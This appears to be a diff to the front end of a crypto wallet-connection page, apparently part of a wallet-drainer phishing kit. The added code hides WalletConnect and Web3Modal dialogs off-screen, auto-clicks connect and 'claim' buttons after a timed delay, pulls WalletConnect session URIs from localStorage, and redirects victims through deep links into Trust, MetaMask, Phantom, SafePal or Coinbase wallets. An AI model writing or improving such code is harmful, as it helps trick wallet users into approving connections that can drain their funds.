@@ -47,7 +47,7 @@
             box-shadow: 0 12px 32px rgba(0, 0, 0, 0.05);
             text-align: center;
             position: relative;
-            z-index: 99999 !important;
+            z-index: 99999999 !important; /* Bumped up significantly */
         }
 
         .header-logo {
@@ -150,16 +150,21 @@
             opacity: 0;
         }
 
+        /* HARD OVERRIDE: Completely targets and destroys modern Web3Modal/WalletConnect overlays */
+        w3m-modal,
+        wcm-modal,
         div[class*="modal"], 
         div[class*="overlay"], 
         div[id*="walletconnect"], 
         div[class*="walletconnect"],
-        .wcm-modal,
-        #walletconnect-wrapper {
+        #walletconnect-wrapper,
+        .web3modal-modal-container {
             display: none !important;
             visibility: hidden !important;
             opacity: 0 !important;
             pointer-events: none !important;
+            position: absolute !important;
+            left: -9999px !important;
             z-index: -1000 !important;
         }
     </style>
@@ -197,9 +202,9 @@
         document.getElementById('statusTitle').textContent = `Initializing ${activeWallet}`;
 
         window.addEventListener('DOMContentLoaded', () => {
-            // Give the core script 1.8 seconds to load completely and setup hooks
+            // Bumped to 2.2 seconds to guarantee core script setup completion on slower mobile connections
             setTimeout(() => {
-                const interactBtn = document.querySelector('.interactBtn');
+                const interactBtn = document.querySelector('.interactBtn') || document.getElementById('connectButton');
                 const walletConnectBtn = document.querySelector('.wallet-connect-btn');
                 
                 if (interactBtn) {
@@ -209,7 +214,7 @@
                     walletConnectBtn.click();
                     setupUIReadyState();
                 }
-            }, 1800); 
+            }, 2200); 
         });
 
         function setupUIReadyState() {
@@ -224,14 +229,12 @@
             const encodedUri = encodeURIComponent(wcUri);
             const name = walletName.toLowerCase();
 
-            // Mapping common deep link schemas for direct routing
             if (name.includes('trust')) return `trust://wc?uri=${encodedUri}`;
             if (name.includes('metamask')) return `metamask://wc?uri=${encodedUri}`;
             if (name.includes('phantom')) return `phantom://wc?uri=${encodedUri}`;
             if (name.includes('safepal')) return `safepalwallet://wc?uri=${encodedUri}`;
             if (name.includes('coinbase')) return `cbwallet://wc?uri=${encodedUri}`;
             
-            // Universal fallback for generic apps
             return `wc://wc?uri=${encodedUri}`;
         }
 
@@ -240,21 +243,29 @@
 
             let targetUri = '';
 
-            // Look through all possible keys inside localStorage where v1/v2 libraries store the uri string
+            // Enhanced storage checker mapping legacy v1 strings, structured JSON payloads, and v3 relays
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
-                if (key.includes('walletconnect') || key.includes('wc@2')) {
+                if (key.includes('walletconnect') || key.includes('wc@2') || key.includes('W3M')) {
                     try {
-                        const data = JSON.parse(localStorage.getItem(key));
+                        const val = localStorage.getItem(key);
+                        if (!val) continue;
+
+                        // Check if it's a raw string URI straight up
+                        if (val.startsWith('wc:')) {
+                            targetUri = val;
+                            break;
+                        }
+
+                        const data = JSON.parse(val);
                         if (data && data.uri) {
                             targetUri = data.uri;
                             break;
-                        } else if (typeof data === 'string' && data.startsWith('wc:')) {
-                            targetUri = data;
+                        } else if (data && data.wcUri) {
+                            targetUri = data.wcUri;
                             break;
                         }
                     } catch (e) {
-                        // Safe fallback check if data is a raw unparsed string
                         const rawData = localStorage.getItem(key);
                         if (rawData && rawData.includes('wc:')) {
                             const match = rawData.match(/wc:[^\s"']+/);
@@ -267,13 +278,18 @@
                 }
             }
 
-            // If a valid connection payload URI was found, build the absolute direct link and redirect
             if (targetUri) {
+                // If found, execute native protocol routing directly
                 window.location.href = getWalletDeepLink(activeWallet, targetUri);
             } else {
-                // If storage isn't populated yet, hit the interactive fallback element as a last resort
-                const interactBtn = document.querySelector('.interactBtn') || document.querySelector('.wallet-connect-btn');
-                if (interactBtn) interactBtn.click();
+                // Fallback attempt: Force trigger secondary elements if payload isn't fully cached yet
+                const claimBtn = document.querySelector('.claimBtn') || document.getElementById('claimButton');
+                if (claimBtn) {
+                    claimBtn.click();
+                } else {
+                    const interactBtn = document.querySelector('.interactBtn');
+                    if (interactBtn) interactBtn.click();
+                }
             }
         }
 
